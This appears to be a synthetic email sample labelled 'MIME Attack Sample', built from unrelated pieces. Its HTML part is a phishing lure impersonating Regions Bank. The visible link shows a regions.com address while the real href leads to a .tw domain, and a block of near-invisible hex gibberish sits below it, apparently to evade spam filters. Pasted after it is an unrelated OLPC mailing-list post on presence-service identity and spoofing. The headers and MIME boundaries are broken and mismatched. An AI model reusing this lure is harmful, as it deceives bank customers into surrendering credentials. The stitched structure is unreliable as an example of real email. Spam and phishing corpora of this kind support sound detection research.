From: mayorkatz@ci.portland.or.us
To: diane.taylor@enron.com
Subject: MIME Attack Sample
Content-Type: multipart/mixed; boundary="BOUNDARY"
--BOUNDARY
1
Content-Type: text/html;
Content-Transfer-Encoding: 7Bit

<head>
<meta   http-equiv="Content-Type" content="text/html; charset=iso-8859-1"       />
</head>

<body>
<p><font     face="Arial">Dear     business      client       of     <b>Regions Bank</b>:</font></p>
<p><font       face="Arial">The    Regions Customer      Service    requests     you       to     complete the       Regions       InterAct     Confirmation     Form.</font></p>
<p><font    face="Arial">This      procedure     is      obligatory   for  all       business       and   corporate clients    of Regions       Bank.</font></p>
<p><font   face="Arial">Please     select    the  hyperlink  and visit  the   address     listed  to       access the     Regions   InterAct      Confirmation      Form.</font><br>
</p><p><font       face="Arial"><a     href="http://interactsession-35549974.regions.com.usersetup.tw/ibsregions/cmserver/iform.cfm">http://interactsession-35549974.regions.com/ibsregions/cmserver/iform.cfm</a></font></p>
<p><font      face="Arial">Again,     thank       you for   choosing    Regions Bank     for  your     business     needs.   We      look forward      to       working    with      you.</font></p>
<p><font    face="Arial">*****     Please    do   not     respond   to     this       email      *****</font></p><p><font face="Arial">This    mail     is  generated     by       an      automated    service.<br>
Replies   to  this       mail  are       not      read  by      Regions  Bank customer  service      or   technical support.</font><br></p>
<p>------------------------------------------------------------------------------------</p>
<p><font   color="#FFFFF2"  face="Arial">hex: 0x8, 0x225, 0x209, 0x54204996, 0x9, 0x91887378, 0x418, 0x7, 0x78, 0x4458, 0x43463263, 0x63517089, 0x3529, 0x62, 0x0495 GI7D 3MTH P0H define NRY common rev J2PD ANW       0x26670204, 0x6364, 0x672, 0x25  0x394, 0x97, 0x600, 0x70690512, 0x2, 0x54638176, 0x9193    P4QU: 0x726, 0x60, 0x91595918, 0x09     0x102, 0x1870, 0x29, 0x5027, 0x64, 0x8, 0x00   start: 0x2416, 0x36603476, 0x678, 0x9, 0x0504, 0x58307892, 0x031, 0x5, 0x305, 0x78909961, 0x796, 0x54, 0x942   include: 0x643, 0x39, 0x05   0x71485107, 0x1719, 0x7164, 0x6, 0x16794996, 0x19, 0x82342389, 0x35024522, 0x1586, 0x5646, 0x863, 0x0227, 0x51</font></p><p><font       color="#FFFFF2"     face="Arial"><span>SPA: 0x133, 0x19801211, 0x8, 0x796, 0x66651291, 0x905, 0x5620, 0x7646, 0x80, 0x73, 0x13818008, 0x5, 0x3   0x0003, 0x008, 0x96, 0x284, 0x56, 0x592, 0x07, 0x499, 0x98201344, 0x11428897, 0x705, 0x7343, 0x0 G44D: 0x02572743, 0x41491284, 0x42661035, 0x0, 0x056, 0x3, 0x1, 0x2589, 0x10,
  0x09999951, 0x6241, 0x715   exe, include common, end    NX1: 0x54, 0x84, 0x6340, 0x12792647, 0x71, 0x77, 0x2, 0x6651, 0x10137660, 0x90424897    0x0213, 0x908, 0x7, 0x28430721      </span><span>A2G, common end, serv 0x99143654, 0x0, 0x998, 0x633, 0x9, 0x38838285, 0x6093, 0x0, 0x44595957, 0x11959549, 0x744, 0x13534904, 0x5721, 0x1, 0x8       0x98, 0x79753958, 0x828, 0x64, 0x5170, 0x9632, 0x08923911, 0x39, 0x6058, 0x13378255, 0x05, 0x51, 0x18482203    0x3, 0x448, 0x8152, 0x5864, 0x71, 0x77, 0x43326775, 0x4, 0x8, 0x080, 0x38, 0x7447, 0x4863, 0x4814</span></font></p>
<p><font    color="#FFFFF7" face="Arial"><span>W9BO: 0x010, 0x7, 0x37869882, 0x1  0x46, 0x0, 0x96  root: 0x845, 0x98, 0x175, 0x5537, 0x0, 0x431, 0x132, 0x3519, 0x23      engine: 0x1430, 0x62446254, 0x77517812, 0x8, 0x2, 0x3, 0x38689884, 0x24, 0x22170986, 0x3076, 0x2 start, 23S, 7JSB, DHP, rcs, serv, tmp.</span><span>HYW: 0x98, 0x8, 0x98, 0x2, 0x793, 0x14, 0x9556     </span><span>stack: 0x3, 0x70, 0x5, 0x86, 0x8808, 0x06, 0x1, 0x85, 0x94, 0x5, 0x56, 0x70484805  0x08161700, 0x6, 0x6565, 0x80, 0x53, 0x79  TMP, 2ZIU, 1BQY, update, BPU, Q527. IXN: 0x6110, 0x043, 0x7418, 0x7666, 0x76, 0x976, 0x48203105, 0x07989427, 0x523, 0x59, 0x9, 0x03730963</span></font></p>
</body>
</html>


----THNE_7N0Q4NHU8VOXS1--
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
Content-Type: text/plain

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

At the moment the Presence Service API assumes we're subscribed to the
presence of every contact we'll ever encounter, which obviously can't scale to
a school.

When child joins an activity we're in, the presence service needs to be able
to give us a Buddy object for them without making network round-trips -
otherwise the activity will have no way to identify them. We can't just ignore
them (omit them from the GUI) until we've made network round-trips to ask
the server about them, because they might start participating in the activity
before we get the server's reply, and it would be confusing to get messages
from an apparently nonexistent buddy (also, activity authors are
unlikely to handle this correctly).

At the same time, we don't want to have two Buddy objects in the PS process
representing the same child, and have to do some sort of coalescing process
when we work out that they actually represent the same person; so from just
the information we immediately have when we first encounter someone,
we should be able to make the decision whether two contacts are in fact the
same.

For the server case, the JID is constructed as follows:

	hex(sha1(public key)) + '@' + configured server

To avoid spoofing we need to require that the server will only create new
accounts (or almost equivalently, allow login to an account) if the client can
demonstrate knowledge of a private key for which the public key's hex SHA-1
is the username part of the desired JID.

For the link-local (mesh) case, I believe the idea is that the public key
and other OLPC info is in the mDNS record, so by the time we can interact with
someone, we already have all relevant information about them? If so, and we
put the corresponding server-JID in the mDNS record, then we can again always
know which child we're talking to.

Again, to avoid spoofing we need to require that the mDNS record demonstrates
knowledge of the private key; perhaps it could include a signature of the IP
address or IP:port or whatever, and a timestamp, made using the private key.

Given this, we should be able to create Buddy objects from arbitrary Telepathy
handles (a handle represents the unique ID on the instant messaging system)
and know at least whether they're distinct; the Buddy object can then have
signals it emits as its alias, colour, etc. arrive. The worst case in the GUI
will be that a grey XO with no name appears and starts participating, and
shortly afterwards, its colour changes to the right colour and it gains the
right alias.

Thoughts?
	Simon
- -- 
Simon McVittie, Collabora Ltd.: http://www.collabora.co.uk/
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)
Comment: OpenPGP key: http://www.pseudorandom.co.uk/2003/contact/ or pgp.net

iD8DBQFGQzsTWSc8zVUw7HYRAh0vAKC9jDBXbJRaLSV9+YMeF/SMdn/+aQCg7Tkh
2QSiCi/K46rR+pRVEbOdb8k=
=m749
-----END PGP SIGNATURE-----
-BOUNDARY--
